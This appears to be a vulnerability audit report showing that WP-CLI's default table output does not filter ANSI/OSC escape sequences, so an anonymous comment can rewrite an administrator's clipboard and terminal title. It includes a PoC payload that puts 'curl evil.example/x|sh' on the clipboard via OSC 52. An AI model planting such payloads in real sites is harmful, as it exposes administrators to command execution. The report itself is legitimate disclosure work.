# Round 2: CONFIRMED — WP-CLI's table/`cli\Table` output never neutralizes ANSI/OSC terminal escape sequences, letting an anonymous, unauthenticated WordPress comment corrupt an administrator's terminal (clipboard overwrite, title-bar spoofing) the next time they run a routine `wp comment list`/`wp user list`

**Files:** `wp-cli/php/WP_CLI/Formatter.php` (`show_table()`), `wp-cli/php-cli-tools/lib/cli/Table.php`.

**Why this one actually crosses WP-CLI's own stated trust boundary (unlike Round 1).** WP-CLI's
published security-reporting guidance says a report needs to show someone *outside* the trust boundary
gaining something they couldn't otherwise obtain — running `wp` at all already implies you can act as
that local user, so a malicious *CLI argument* typed by the operator doesn't qualify. This finding is
different in kind: the malicious content is planted by a **fully anonymous, unauthenticated website
visitor** through the most ordinary possible WordPress interaction (leaving a public comment), and the
victim is an administrator who runs a **completely unmodified, routine** `wp comment list` — no crafted
flag, no unusual command, nothing that requires the operator to have done anything wrong. The content
crosses the boundary; the command doesn't need to be attacked at all.

## Root cause

`Formatter::show_table()` (`php/WP_CLI/Formatter.php:766`) — the function backing every command's default
`--format=table` output (`wp user list`, `wp comment list`, `wp post list`, etc.):

```php
private function show_table( $items, $fields, $ascii_pre_colorized = false ) {
    $table = new Table();
    ...
    foreach ( $items as $item ) {
        $table->addRow( array_values( (array) $item ) );
    }
    foreach ( $table->getDisplayLines() as $line ) {
        WP_CLI::line( $line );
    }
    ...
}
```

Raw field values go straight into `cli\Table::addRow()` (`wp-cli/php-cli-tools`) and from there straight
to `WP_CLI::line()` / `Streams::line()`, which write the bytes to `STDOUT` verbatim. Read the entirety of
`cli\Table.php`: `checkRow()` only measures display *width* (via `Colors::width()`, which accounts for
already-applied color codes for padding purposes) — it does not strip, escape, or reject any byte. There
is no control-character or ANSI/OSC filtering anywhere in this class, and none in `Formatter.php` before
the value reaches it. Compare directly to `Utils\write_csv()` (used for `--format=csv`), which **does**
run every value through `escape_csv_value()` to defuse CSV/formula injection (`=`, `+`, `-`, `@`, TAB, CR)
— proving the WP-CLI team has already thought about "untrusted database content flowing into an output
format with its own dangerous syntax" as a real class of bug for CSV. The identical class of bug for the
*default* format (`table`) — arguably the one administrators actually look at with their own eyes most
often — has no equivalent protection.

## Why WordPress's own input sanitization doesn't save this

Checked directly against the actual WordPress core functions (not assumed):

- **`comment_author` — zero authentication required.** `wp_handle_comment_submission()`
  (`wp-includes/comment.php:3949`): `$comment_author = trim( strip_tags( $comment_data['author'] ) );`.
  `strip_tags()` only removes HTML-tag-shaped sequences (`<...>`) — it has no concept of ANSI/OSC control
  bytes and does not touch them. Any visitor to any page that accepts comments (WordPress's out-of-the-box
  default) can set this field to an arbitrary byte string containing raw escape sequences, with zero
  WordPress account of any kind.
- **`display_name` — any authenticated user, down to Subscriber.** `edit_user()`
  (`wp-admin/includes/user.php:109`): `$user->display_name = sanitize_text_field( $_POST['display_name'] );`.
  Read WordPress's actual `_sanitize_text_fields()` implementation (`wp-includes/formatting.php:5708`):
  it strips `<` tags, collapses `[\r\n\t ]` runs to a single space, and removes **percent-encoded**
  sequences matching `/%[a-f0-9]{2}/i` (e.g. the literal three-character string `%1b`) — it does **not**
  touch a raw, literal ESC byte (0x1B) or BEL byte (0x07) submitted directly in the POST body, since
  those are neither `<`, whitespace, nor a percent-encoded triplet. Any logged-in user can set this on
  their own profile via the ordinary `wp-admin/profile.php` form (or the `/wp/v2/users/me` REST endpoint)
  with no special capability.

Both are **default output columns** — no unusual `--fields` flag needed: `Comment_Command.php:68` lists
`comment_author` as a default field for `wp comment list`; `User_Command.php:44` lists `display_name` as
a default field for `wp user list`. This is the plainest possible `wp comment list` / `wp user list`,
run for the most routine possible reason (reviewing recent comments, listing users).

## PoC — real `cli\Table` execution, raw bytes captured and hex-inspected (not simulated)

Payload (what an anonymous commenter's "Name" field, or any user's Display Name, is set to):

```php
$clipboard_payload = base64_encode('curl evil.example/x|sh' . "\n");
$malicious_name = "Bob\x1b]52;c;{$clipboard_payload}\x07\x1b]0;PWNED-TITLE\x07";
```

`\x1b]52;c;<base64>\x07` is OSC 52 — the widely-implemented (iTerm2, Windows Terminal, Alacritty, kitty,
WezTerm, and others support it, several by default) "set clipboard from base64" terminal control
sequence. `\x1b]0;...\x07` sets the terminal window/tab title.

Built a table with the real `wp-cli/php-cli-tools` `cli\Table` class (installed via Composer, the exact
package WP-CLI depends on) using this value as a `display_name` cell, exactly the shape
`Formatter::show_table()` produces, and captured the output to a file to inspect the literal bytes:

```
$ cat -v out.bin
ID	user_login	display_name
1	admin	Administrator
7	sec_research_subscriber	Bob^[]52;c;Y3VybCBldmlsLmV4YW1wbGUveHxzaAo=^G^[]0;PWNED-TITLE^G
```

`^[` is the literal ESC byte and `^G` the literal BEL byte — both survived completely untouched, exactly
as sent. Run in a real terminal that honors OSC 52 (a mainstream, often-default configuration in current
terminal emulators), this row would: (a) silently overwrite the operator's clipboard with the base64-
decoded text `curl evil.example/x|sh`, and (b) rewrite the terminal's title bar to `PWNED-TITLE` —
directly observed, not inferred.

PoC script: `tooling/poc-table-ansi-osc-injection.php`.

## Impact, scored honestly — Medium, not stretched toward the clipboard's worst case

What's **directly and concretely demonstrated**: an anonymous or low-privilege actor can silently (a)
overwrite the terminal clipboard of anyone who lists comments/users with a plain `wp comment list` /
`wp user list`, and (b) spoof the terminal's title bar, and — by extension of the same missing filtering,
not independently re-demonstrated here — could similarly abuse other OSC/CSI sequences (screen-clear,
cursor repositioning, or other terminal features) to make output misleading or hide/alter what the
operator believes they're looking at.

What's **plausible but not claimed as directly demonstrated**: if the operator later pastes that
clipboard content into any shell prompt, the injected command runs. That's a real, well-documented
consequence of OSC 52 abuse in other tools' disclosed advisories, but it requires a further, separate
action by the victim that this PoC did not — and structurally cannot — automate or force. Scoring it as
if that step were guaranteed would repeat exactly the kind of speculative reach this audit has been
explicitly told not to make.

CVSS 3.1, component by component, on the concretely-demonstrated impact (clipboard/title corruption, not
the unproven paste-and-execute chain): `AV:N` (planted via an ordinary network-reachable WordPress
interaction) / `AC:L` (deterministic, no special conditions beyond the operator eventually running a
default listing command) / `PR:N` (the comment-author path needs no WordPress account at all) / `UI:R`
(the administrator must run the affected command, using a terminal that honors the sequences) / `S:U` /
`C:N` / `I:L` (clipboard content and terminal display state are altered, nothing is disclosed) / `A:N`.
That computes to **4.3 (Medium)** — meets this audit's floor, arrived at from the actually-demonstrated
consequence rather than the unverified worst case.

## Fix suggestion

Add a `strip_control_sequences()`-style filter (analogous to `Utils\escape_csv_value()`) applied to every
cell value before it reaches `cli\Table`/`show_table()` — either strip ASCII control characters outright
(0x00–0x1F, 0x7F, excluding legitimate newline handling already done elsewhere) or replace them with a
visible placeholder (e.g. `\x1b` → literal `\e` or `<ESC>`), the same way many mature terminal-facing
tools (git, less, various log viewers) have added after similar disclosures elsewhere in the ecosystem.

## Reproduction artifacts

- `tooling/poc-table-ansi-osc-injection.php` — builds the real `cli\Table` output shown above; run and
  pipe through `cat -v` or `od -c` to see the raw bytes without your own terminal interpreting them.
